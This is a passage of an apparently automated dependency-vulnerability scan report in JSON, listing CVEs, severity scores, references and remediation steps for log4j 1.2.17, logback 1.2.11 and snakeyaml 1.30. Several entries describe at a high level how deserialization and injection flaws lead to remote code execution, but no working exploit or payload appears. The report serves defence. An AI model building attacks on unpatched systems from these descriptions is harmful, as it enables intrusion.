          "https://lists.apache.org/thread.html/r746fbc3fc13aee292ae6851f7a5080f592fa3a67b983c6887cdb1fc5%40%3Cdev.tika.apache.org%3E",
          "https://lists.apache.org/thread.html/479471e6debd608c837b9815b76eab24676657d4444fcfd5ef96d6e6@%3Cdev.tika.apache.org%3E",
          "https://lists.apache.org/thread.html/rc1eaed7f7d774d5d02f66e49baced31e04827a1293d61a70bd003ca7%40%3Cdev.tika.apache.org%3E",
          "https://lists.apache.org/thread.html/r8418a0dff1729f19cf1024937e23a2db4c0f94f2794a423f5c10e8e7%40%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r4ac89cbecd9e298ae9fafb5afda6fa77ac75c78d1ac957837e066c4e@%3Cuser.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/8ab32b4c9f1826f20add7c40be08909de9f58a89dc1de9c09953f5ac%40%3Cissues.activemq.apache.org%3E",
          "https://lists.apache.org/thread.html/r6aec6b8f70167fa325fb98b3b5c9ce0ffaed026e697b69b85ac24628%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rd0e44e8ef71eeaaa3cf3d1b8b41eb25894372e2995ec908ce7624d26%40%3Ccommits.pulsar.apache.org%3E",
          "https://lists.apache.org/thread.html/rd6254837403e8cbfc7018baa9be29705f3f06bd007c83708f9a97679%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rdb7ddf28807e27c7801f6e56a0dfb31092d34c61bdd4fa2de9182119@%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r594411f4bddebaf48a4c70266d0b7849e0d82bb72826f61b3a35bba7%40%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r3c575cabc7386e646fb12cb82b0b38ae5a6ade8a800f827107824495%40%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/8ab32b4c9f1826f20add7c40be08909de9f58a89dc1de9c09953f5ac@%3Cissues.activemq.apache.org%3E",
          "https://lists.apache.org/thread.html/r5c084578b3e3b40bd903c9d9e525097421bcd88178e672f612102eb2%40%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/rf9c19bcc2f7a98a880fa3e3456c003d331812b55836b34ef648063c9@%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/raedd12dc24412b3780432bf202a2618a21a727788543e5337a458ead%40%3Cissues.activemq.apache.org%3E",
          "https://lists.apache.org/thread.html/r696507338dd5f44efc23d98cafe30f217cf3ba78e77ed1324c7a5179%40%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/44491fb9cc19acc901f7cff34acb7376619f15638439416e3e14761c@%3Cdev.tika.apache.org%3E",
          "https://lists.apache.org/thread.html/r8890b8f18f1de821595792b58b968a89692a255bc20d86d395270740@%3Ccommits.druid.apache.org%3E",
          "https://lists.apache.org/thread.html/rd7805c1bf9388968508c6c8f84588773216e560055ddcc813d19f347%40%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/r61590890edcc64140e0c606954b29a063c3d08a2b41d447256d51a78@%3Cissues.activemq.apache.org%3E",
          "https://lists.apache.org/thread.html/r189aaeaad897f7d6b96f7c43a8ef2dfb9f6e9f8c1cc9ad182ce9b9ae@%3Cjira.kafka.apache.org%3E",
          "https://www.debian.org/security/2020/dsa-4686",
          "https://lists.apache.org/thread.html/r2721aba31a8562639c4b937150897e24f78f747cdbda8641c0f659fe%40%3Cusers.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r2ce8d26154bea939536e6cf27ed02d3192bf5c5d04df885a80fe89b3@%3Cissues.activemq.apache.org%3E",
          "https://lists.apache.org/thread.html/479471e6debd608c837b9815b76eab24676657d4444fcfd5ef96d6e6%40%3Cdev.tika.apache.org%3E",
          "https://lists.apache.org/thread.html/reaf6b996f74f12b4557bc221abe88f58270ac583942fa41293c61f94@%3Cpluto-scm.portals.apache.org%3E",
          "https://lists.apache.org/thread.html/rf9fa47ab66495c78bb4120b0754dd9531ca2ff0430f6685ac9b07772%40%3Cdev.mina.apache.org%3E",
          "https://lists.apache.org/thread.html/r2756fd570b6709d55a61831ca028405bcb3e312175a60bc5d911c81f%40%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r681b4432d0605f327b68b9f8a42662993e699d04614de4851c35ffd1%40%3Cdev.tika.apache.org%3E",
          "https://lists.apache.org/thread.html/reaf6b996f74f12b4557bc221abe88f58270ac583942fa41293c61f94%40%3Cpluto-scm.portals.apache.org%3E",
          "https://lists.apache.org/thread.html/r8a1cfd4705258c106e488091fcec85f194c82f2bbde6bd151e201870%40%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r8c6300245c0bcef095e9f07b48157e2c6471df0816db3408fcf1d748%40%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/rd3a9511eebab60e23f224841390a3f8cd5358cff605c5f7042171e47@%3Cdev.tinkerpop.apache.org%3E",
          "https://lists.apache.org/thread.html/rd5dbeee4808c0f2b9b51479b50de3cc6adb1072c332a200d9107f13e%40%3Cissues.activemq.apache.org%3E",
          "https://lists.apache.org/thread.html/rbd19de368abf0764e4383ec44d527bc9870176f488a494f09a40500d@%3Ccommon-dev.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/r107c8737db39ec9ec4f4e7147b249e29be79170b9ef4b80528105a2d@%3Cdev.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r4b25538be50126194cc646836c718b1a4d8f71bd9c912af5b59134ad@%3Cdev.tika.apache.org%3E",
          "https://lists.apache.org/thread.html/r7f462c69d5ded4c0223e014d95a3496690423c5f6f05c09e2f2a407a%40%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/ra38785cfc0e7f17f8e24bebf775dd032c033fadcaea29e5bc9fffc60@%3Cdev.tika.apache.org%3E",
          "https://lists.apache.org/thread.html/ra9611a8431cb62369bce8909d7645597e1dd45c24b448836b1e54940@%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r944183c871594fe9a555b8519a7c945bbcf6714d72461aa6c929028f@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r6d34da5a0ca17ab08179a30c971446c7421af0e96f6d60867eabfc52%40%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rca24a281000fb681d7e26e5c031a21eb4b0593a7735f781b53dae4e2%40%3Cdev.tika.apache.org%3E",
          "https://security.netapp.com/advisory/ntap-20200110-0001/",
          "https://lists.apache.org/thread.html/r8c6300245c0bcef095e9f07b48157e2c6471df0816db3408fcf1d748@%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/rc628307962ae1b8cc2d21b8e4b7dd6d7755b2dd52fa56a151a27e4fd@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r8a1cfd4705258c106e488091fcec85f194c82f2bbde6bd151e201870@%3Cjira.kafka.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpuapr2020.html",
          "https://lists.debian.org/debian-lts-announce/2020/01/msg00008.html",
          "https://lists.apache.org/thread.html/r356d57d6225f91fdc30f8b0a2bed229d1ece55e16e552878c5fa809a@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r18f1c010b554a3a2d761e8ffffd8674fd4747bcbcf16c643d708318c%40%3Cissues.activemq.apache.org%3E",
          "https://lists.apache.org/thread.html/r2ff63f210842a3c5e42f03a35d8f3a345134d073c80a04077341c211%40%3Cissues.activemq.apache.org%3E",
          "https://lists.apache.org/thread.html/r3d666e4e8905157f3c046d31398b04f2bfd4519e31f266de108c6919%40%3Cissues.activemq.apache.org%3E",
          "https://lists.apache.org/thread.html/r61db8e7dcb56dc000a5387a88f7a473bacec5ee01b9ff3f55308aacc@%3Cusers.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/rf2567488cfc9212b42e34c6393cfa1c14e30e4838b98dda84d71041f@%3Cdev.tika.apache.org%3E",
          "https://lists.apache.org/thread.html/rb1b29aee737e1c37fe1d48528cb0febac4f5deed51f5412e6fdfe2bf%40%3Cissues.activemq.apache.org%3E",
          "https://usn.ubuntu.com/4495-1/",
          "https://lists.apache.org/thread.html/277b4b5c2b0e06a825ccec565fa65bd671f35a4d58e3e2ec5d0618e1%40%3Cdev.tika.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpujul2020.html",
          "https://lists.apache.org/thread.html/rbdf18e39428b5c80fc35113470198b1fe53b287a76a46b0f8780b5fd%40%3Cdev.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r909b8e3a36913944d3b7bafe9635d4ca84f8f0e2cd146a1784f667c2@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r9dc2505651788ac668299774d9e7af4dc616be2f56fdc684d1170882%40%3Cusers.activemq.apache.org%3E",
          "https://lists.apache.org/thread.html/rcd71280585425dad7e232f239c5709e425efdd0d3de4a92f808a4767%40%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r3784834e80df2f284577a5596340fb84346c91a2dea6a073e65e3397%40%3Cissues.activemq.apache.org%3E",
          "https://lists.apache.org/thread.html/rbd19de368abf0764e4383ec44d527bc9870176f488a494f09a40500d%40%3Ccommon-dev.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/r9dc2505651788ac668299774d9e7af4dc616be2f56fdc684d1170882@%3Cusers.activemq.apache.org%3E",
          "https://lists.apache.org/thread.html/r9d2e28e71f91ba0b6f4114c8ecd96e2b1f7e0d06bdf8eb768c183aa9@%3Ccommon-issues.hadoop.apache.org%3E"
        ],
        "extended_information": {
          "short_description": "Deserialization of an untrusted user input in Log4j leads to remote code execution when using vulnerable logging classes.",
          "full_description": "This vulnerability in Log4j 1.2.x is the same as CVE-2017-5645, which was found and fixed for Log4j 2.x in version 2.8.2. For more technical details on the original issue, see the [relevant ticket](https://issues.apache.org/jira/browse/LOG4J2-1863) in the Log4j JIRA. This issue is only relevant to applications that use Log4j socket classes (specifically `SocketServer` and classes using it, as `TcpSocketServer`, `UdpSocketServer` and `SecureTcpSocketServer`) to receive (over TCP or UDP) and then deserialize untrusted log events. An attacker that controls these events would craft a payload containing a gadget chain that upon deserialization would create objects from specific Java classes. These specially selected classes allow that attacker to invoke methods that would ultimately allow to execute arbitrary code by running a process or overwriting a critical file.",
          "jfrog_research_severity": "Critical",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue can be exploited by attackers over the network",
              "description": "If one of the vulnerable classes are used (`SocketServer` etc.), the vulnerability is remotely exploitable by default."
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "Remote code execution"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "Only the use of the `SockerServer` class and its extensions (`TcpSockerServer`, `UdpSocketServer and `SecureTcpSockerServer`) renders the program vulnerable.",
              "is_positive": true
            },
            {
              "name": "The issue has an exploit published",
              "description": "Many public exploits demonstrate remote code execution"
            },
            {
              "name": "The issue has a detailed technical explanation published, that can aid in exploit development"
            },
            {
              "name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
              "description": "A Java \"gadget\" class must be available in the vulnerable app's Classpath. However - some gadgets exist in extremely common packages such as `apache-commons`."
            }
          ],
          "remediation": "##### Development mitigations\n\nReplace usage of `SocketReceiver` and `UDPReceiver` with `XMLSocketReceiver`, which supplies the same interface and is not vulnerable to this issue"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2022-23307",
            "cvss_v2_score": "9.0",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:L/Au:S/C:C/I:C/A:C",
            "cvss_v3_score": "8.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "CVE-2020-9493 identified a deserialization issue that was present in Apache Chainsaw. Prior to Chainsaw V2.0 Chainsaw was a component of Apache Log4j 1.2.x where the same issue exists.",
        "severity": "High",
        "components": {
          "gav://log4j:log4j:1.2.17": {
            "impact_paths": [
              [
                {
                  "component_id": "gav://log4j:log4j:1.2.17"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-194888",
        "references": [
          "https://nvd.nist.gov/vuln/detail/CVE-2022-23307",
          "https://logging.apache.org/log4j/1.2/index.html",
          "https://www.oracle.com/security-alerts/cpuapr2022.html",
          "https://www.oracle.com/security-alerts/cpujul2022.html",
          "https://lists.apache.org/thread/rg4yyc89vs3dw6kpy3r92xop9loywyhh"
        ],
        "extended_information": {
          "short_description": "An insecure deserialization vulnerability in Apache Chainsaw (part of Log4j 1.2.x) allows an attacker to perform remote code execution by sending a crafted serialized log.",
          "full_description": "Chainsaw is a Java-based GUI for Log4j. It allows interacting with the Log4j API, collecting, viewing and analyzing various logs. Chainsaw can interpret logs in XML format and has the ability to receive logs from local and remote locations.\n\nThis issue is remotely exploitable if Chainsaw is configured with the `SocketReceiver` or `UDPReceiver` interfaces, which listen for remote log events.\n\nSpecifically, Chainsaw (and Log4j) can receive logs via network with the `SocketReceiver` or `UDPReceiver` interfaces. When these interfaces are used, the data is expected to be a serialized java object, and it immediately gets deserialized without any validation on the type of the Java object.\nThis leads to immediate code execution, as the deserialized object may trigger [code execution gadgets](https://speakerdeck.com/frohoff/appseccali-2015-marshalling-pickles-how-deserializing-objects-can-ruin-your-day).\n\nAttackers that can send logs to the Apache Chainsaw server can craft a special Java `LoggingEvent` object that has a malicious `setProperty` method. This method is called directly after deserialization, which will allow the attacker to run arbitrary Java code on the victim machine.",
          "jfrog_research_severity": "Critical",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue is trivial to exploit and does not require a published writeup or PoC"
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)"
            },
            {
              "name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)"
            },
            {
              "name": "The issue can be exploited by attackers over the network"
            }
          ],
          "remediation": "##### Deployment mitigations\n\nModify the Apache Chainsaw configuration file to use ` XMLSocketReceiver`:\n\n```\n\u003cplugin name=\"XMLSocketReceiver\" class=\"org.apache.log4j.net.XMLSocketReceiver\"\u003e\n\u003cparam name=\"decoder\" value=\"org.apache.log4j.xml.UtilLoggingXMLDecoder\"/\u003e\n\u003cparam name=\"Port\" value=\"2222\"/\u003e\n\u003c/plugin\u003e\n```\n\nMake sure `SocketReceiver` and `UDPReceiver` are disabled by removing the following from the configuration file:\n\n```\n\u003cplugin name=\"SocketReceiver\" class=\"org.apache.log4j.net.SocketReceiver\"\u003e\n\u003cparam name=\"Port\" value=\"4445\"/\u003e\n\u003c/plugin\u003e\n```\nand\n\n```\n\u003cplugin name=\"UDPReceiver\" class=\"org.apache.log4j.net.UDPReceiver\"\u003e\n\u003cparam name=\"Port\" value=\"4445\"/\u003e\n\u003c/plugin\u003e\n```"
        }
      }
    ],
    "component_id": "gav://log4j:log4j:1.2.17",
    "package_type": "maven",
    "status": "completed"
  },
  {
    "scan_id": "ab77ecc0-8854-41ee-6da7-4b863d3f2e2a",
    "component_id": "gav://org.apache.logging.log4j:log4j-api:2.17.2",
    "package_type": "maven",
    "status": "completed"
  },
  {
    "scan_id": "c856159a-534f-476c-72b5-90add2c25e93",
    "component_id": "gav://org.apache.logging.log4j:log4j-to-slf4j:2.17.2",
    "package_type": "maven",
    "status": "completed"
  },
  {
    "scan_id": "ca353036-eaa6-43c6-6d64-209ead38486e",
    "vulnerabilities": [
      {
        "cves": [
          {
            "cve": "CVE-2023-6378",
            "cvss_v3_score": "7.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "A serialization vulnerability in logback receiver component part of \nlogback version 1.4.11 allows an attacker to mount a Denial-Of-Service \nattack by sending poisoned data.",
        "severity": "High",
        "components": {
          "gav://ch.qos.logback:logback-classic:1.2.11": {
            "fixed_versions": [
              "[1.2.13]",
              "[1.3.12]",
              "[1.4.12]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://ch.qos.logback:logback-classic:1.2.11"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-539985",
        "references": [
          "https://security.netapp.com/advisory/ntap-20241129-0012/",
          "https://security.netapp.com/advisory/ntap-20241129-0012",
          "https://github.com/qos-ch/logback/commit/bb095154be011267b64e37a1d401546e7cc2b7c3",
          "https://logback.qos.ch/news.html#1.2.13",
          "https://github.com/qos-ch/logback/commit/9c782b45be4abdafb7e17481e24e7354c2acd1eb",
          "https://github.com/qos-ch/logback/commit/b8eac23a9de9e05fb6d51160b3f46acd91af9731",
          "https://logback.qos.ch/manual/receivers.html",
          "https://github.com/advisories/GHSA-vmq6-5m68-f53m",
          "https://logback.qos.ch/news.html#1.3.12",
          "https://nvd.nist.gov/vuln/detail/CVE-2023-6378",
          "https://github.com/qos-ch/logback/issues/745#issuecomment-1836227158"
        ]
      }
    ],
    "component_id": "gav://ch.qos.logback:logback-classic:1.2.11",
    "package_type": "maven",
    "status": "completed"
  },
  {
    "scan_id": "52f30c35-2a26-4e57-787f-5e036b2a70db",
    "vulnerabilities": [
      {
        "cves": [
          {
            "cve": "CVE-2024-12801",
            "cwe": [
              "CWE-918"
            ],
            "cwe_details": {
              "CWE-918": {
                "name": "Server-Side Request Forgery (SSRF)",
                "description": "The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "19"
                  }
                ]
              }
            }
          }
        ],
        "summary": "Server-Side Request Forgery (SSRF) in SaxEventRecorder by QOS.CH logback version 0.1 to 1.3.14 and 1.4.0 to 1.5.12  on the Java platform, allows an attacker to \nforge requests by compromising logback configuration files in XML.\n\n\n\nThe attacks involves the modification of DOCTYPE declaration in  XML configuration files.",
        "severity": "Low",
        "components": {
          "gav://ch.qos.logback:logback-core:1.2.11": {
            "fixed_versions": [
              "[1.3.15]",
              "[1.5.13]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://ch.qos.logback:logback-core:1.2.11"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-661748",
        "references": [
          "https://logback.qos.ch/news.html#1.5.13",
          "https://logback.qos.ch/news.html#1.3.15",
          "https://nvd.nist.gov/vuln/detail/CVE-2024-12801",
          "https://github.com/qos-ch/logback/commit/5f05041cba4c4ac0a62748c5c527a2da48999f2d",
          "https://github.com/advisories/GHSA-6v67-2wr5-gvf4"
        ]
      },
      {
        "cves": [
          {
            "cve": "CVE-2024-12798",
            "cwe": [
              "CWE-917"
            ],
            "cwe_details": {
              "CWE-917": {
                "name": "Improper Neutralization of Special Elements used in an Expression Language Statement ('Expression Language Injection')",
                "description": "The product constructs all or part of an expression language (EL) statement in a framework such as a Java Server Page (JSP) using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended EL statement before it is executed."
              }
            }
          }
        ],
        "summary": "ACE vulnerability in JaninoEventEvaluator  by QOS.CH logback-core\n      upto including version 0.1 to 1.3.14 and 1.4.0 to 1.5.12 in Java applications allows\n      attacker to execute arbitrary code by compromising an existing\n      logback configuration file or by injecting an environment variable\n      before program execution.\n\n\n\n\n\nMalicious logback configuration files can allow the attacker to execute \narbitrary code using the JaninoEventEvaluator extension.\n\n\n\nA successful attack requires the user to have write access to a \nconfiguration file. Alternatively, the attacker could inject a malicious \nenvironment variable pointing to a malicious configuration file. In both \ncases, the attack requires existing privilege.",
        "severity": "Medium",
        "components": {
          "gav://ch.qos.logback:logback-core:1.2.11": {
            "fixed_versions": [
              "[1.3.15]",
              "[1.5.13]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://ch.qos.logback:logback-core:1.2.11"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-661746",
        "references": [
          "https://logback.qos.ch/news.html#1.5.13",
          "https://nvd.nist.gov/vuln/detail/CVE-2024-12798",
          "https://github.com/advisories/GHSA-pr98-23f8-jwxv",
          "https://github.com/qos-ch/logback/commit/2cb6d520df7592ef1c3a198f1b5df3c10c93e183",
          "https://logback.qos.ch/news.html#1.3.15"
        ]
      },
      {
        "cves": [
          {
            "cve": "CVE-2023-6378",
            "cvss_v3_score": "7.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "A serialization vulnerability in logback receiver component part of \nlogback version 1.4.11 allows an attacker to mount a Denial-Of-Service \nattack by sending poisoned data.",
        "severity": "High",
        "components": {
          "gav://ch.qos.logback:logback-core:1.2.11": {
            "fixed_versions": [
              "[1.2.13]",
              "[1.3.12]",
              "[1.4.12]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://ch.qos.logback:logback-core:1.2.11"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-539985",
        "references": [
          "https://security.netapp.com/advisory/ntap-20241129-0012/",
          "https://security.netapp.com/advisory/ntap-20241129-0012",
          "https://github.com/qos-ch/logback/commit/bb095154be011267b64e37a1d401546e7cc2b7c3",
          "https://logback.qos.ch/news.html#1.2.13",
          "https://github.com/qos-ch/logback/commit/9c782b45be4abdafb7e17481e24e7354c2acd1eb",
          "https://github.com/qos-ch/logback/commit/b8eac23a9de9e05fb6d51160b3f46acd91af9731",
          "https://logback.qos.ch/manual/receivers.html",
          "https://github.com/advisories/GHSA-vmq6-5m68-f53m",
          "https://logback.qos.ch/news.html#1.3.12",
          "https://nvd.nist.gov/vuln/detail/CVE-2023-6378",
          "https://github.com/qos-ch/logback/issues/745#issuecomment-1836227158"
        ]
      }
    ],
    "component_id": "gav://ch.qos.logback:logback-core:1.2.11",
    "package_type": "maven",
    "status": "completed"
  },
  {
    "scan_id": "b728b8c5-b6b7-4f4a-4f0b-604ed4ee6269",
    "component_id": "gav://org.slf4j:slf4j-api:1.7.36",
    "package_type": "maven",
    "status": "completed"
  },
  {
    "scan_id": "61fc6761-9a13-444d-7524-e849aa82215e",
    "vulnerabilities": [
      {
        "cves": [
          {
            "cve": "CVE-2022-25857",
            "cvss_v3_score": "7.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cwe": [
              "CWE-776",
              "CWE-400"
            ],
            "cwe_details": {
              "CWE-400": {
                "name": "Uncontrolled Resource Consumption",
                "description": "The product does not properly control the allocation and maintenance of a limited resource, thereby enabling an actor to influence the amount of resources consumed, eventually leading to the exhaustion of available resources."
              },
              "CWE-776": {
                "name": "Improper Restriction of Recursive Entity References in DTDs ('XML Entity Expansion')",
                "description": "The product uses XML documents and allows their structure to be defined with a Document Type Definition (DTD), but it does not properly control the number of recursive definitions of entities."
              }
            }
          }
        ],
        "summary": "The package org.yaml:snakeyaml from 0 and before 1.31 are vulnerable to Denial of Service (DoS) due missing to nested depth limitation for collections.",
        "severity": "High",
        "components": {
          "gav://org.yaml:snakeyaml:1.30": {
            "fixed_versions": [
              "[1.31]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-253124",
        "references": [
          "https://nvd.nist.gov/vuln/detail/CVE-2022-25857",
          "https://github.com/advisories/GHSA-3mc7-4q67-w48m",
          "https://security.snyk.io/vuln/SNYK-JAVA-ORGYAML-2806360",
          "https://security.netapp.com/advisory/ntap-20240315-0010",
          "https://security.netapp.com/advisory/ntap-20240315-0010/",
          "https://github.com/snakeyaml/snakeyaml/commit/fc300780da21f4bb92c148bc90257201220cf174",
          "https://bitbucket.org/snakeyaml/snakeyaml/commits/fc300780da21f4bb92c148bc90257201220cf174",
          "https://bitbucket.org/snakeyaml/snakeyaml/issues/525",
          "https://lists.debian.org/debian-lts-announce/2022/10/msg00001.html"
        ],
        "extended_information": {
          "short_description": "Improper limitation of nesting depth in SnakeYAML leads to denial of service when parsing untrusted YAML data.",
          "full_description": "[SnakeYAML](https://bitbucket.org/snakeyaml/snakeyaml/) is a popular Java-based YAML parsing that provides a high-level API for serialization and deserialization of YAML documents.\n\nIt was discovered that a crafted YAML file containing many nested keys can lead to denial of service due to stack exhaustion.\nTo exploit this issue, an attacker must find remote input that propagates into the `Yaml.load()` method. Note that the issue can be exploited even if the `Yaml` class is initialized with a `SafeConstructor`:\n```\nYaml yaml = new Yaml(new SafeConstructor());\nyaml.load(external_data);\n```\n\n\nA PoC was published [here](https://bitbucket.org/snakeyaml/snakeyaml/issues/525/got-stackoverflowerror-for-many-open)",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "An attacker must find remote input that propagates into the `Yaml.load()` method. Note that the issue can be exploited even if the `Yaml` class is initialized with a `SafeConstructor` or with a `Constructor` that accepts an explicit type only.",
              "is_positive": true
            },
            {
              "name": "The issue has an exploit published",
              "description": "PoC demonstrates denial of service"
            },
            {
              "name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
              "description": "It is highly likely that SnakeYAML will be used to parse externally-supplied YAML data"
            }
          ],
          "remediation": "##### Development mitigations\n\nWrap SnakeYAML's `load` method with exception handling -\n```java\ntry {\n\tString parsed = yaml.load(strYaml);\n}\ncatch(StackOverflowError e) {\n\tSystem.err.println(\"ERROR: Stack limit reached\");\n}\n```"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2022-1471",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-20",
              "CWE-502",
              "CWE-913"
            ],
            "cwe_details": {
              "CWE-20": {
                "name": "Improper Input Validation",
                "description": "The product receives input or data, but it does not validate or incorrectly validates that the input has the properties that are required to process the data safely and correctly.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "6"
                  }
                ]
              },
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              },
              "CWE-913": {
                "name": "Improper Control of Dynamically-Managed Code Resources",
                "description": "The product does not properly restrict reading from or writing to dynamically-managed code resources such as variables, objects, classes, attributes, functions, or executable instructions or statements."
              }
            }
          }
        ],
        "summary": "SnakeYaml's Constructor() class does not restrict types which can be instantiated during deserialization. Deserializing yaml content provided by an attacker can lead to remote code execution. We recommend using SnakeYaml's SafeConsturctor when parsing untrusted content to restrict deserialization. We recommend upgrading to version 2.0 and beyond.",
        "severity": "Critical",
        "components": {
          "gav://org.yaml:snakeyaml:1.30": {
            "fixed_versions": [
              "[2.0]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://org.yaml:snakeyaml:1.30"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-262821",
        "references": [
          "https://security.netapp.com/advisory/ntap-20230818-0015",
          "https://github.com/advisories/GHSA-mjmj-j48q-9wg2",
          "http://www.openwall.com/lists/oss-security/2023/11/19/1",
          "https://infosecwriteups.com/%EF%B8%8F-inside-the-160-comment-fight-to-fix-snakeyamls-rce-default-1a20c5ca4d4c",
          "https://confluence.atlassian.com/security/cve-2022-1471-snakeyaml-library-rce-vulnerability-in-multiple-products-1296171009.html",
          "https://github.com/mbechler/marshalsec",
          "https://github.com/pytorch/serve",
          "https://github.com/google/security-research/security/advisories/GHSA-mjmj-j48q-9wg2",
          "https://bitbucket.org/snakeyaml/snakeyaml/issues/561/cve-2022-1471-vulnerability-in#comment-64634374",
          "http://packetstormsecurity.com/files/175095/PyTorch-Model-Server-Registration-Deserialization-Remote-Code-Execution.html",
          "https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true",
          "https://bitbucket.org/snakeyaml/snakeyaml/commits/acc44099f5f4af26ff86b4e4e4cc1c874e2dc5c4",
          "https://bitbucket.org/snakeyaml/snakeyaml/wiki/CVE-2022-1471",
          "https://bitbucket.org/snakeyaml/snakeyaml/issues/561/cve-2022-1471-vulnerability-in#comment-64876314",
          "https://github.com/pytorch/serve/pull/2523",
          "https://snyk.io/blog/unsafe-deserialization-snakeyaml-java-cve-2022-1471",
          "https://security.netapp.com/advisory/ntap-20240621-0006",
          "https://groups.google.com/g/kubernetes-security-announce/c/mwrakFaEdnc",
          "https://bitbucket.org/snakeyaml/snakeyaml/commits/5014df1a36f50aca54405bb8433bc99a8847f758",
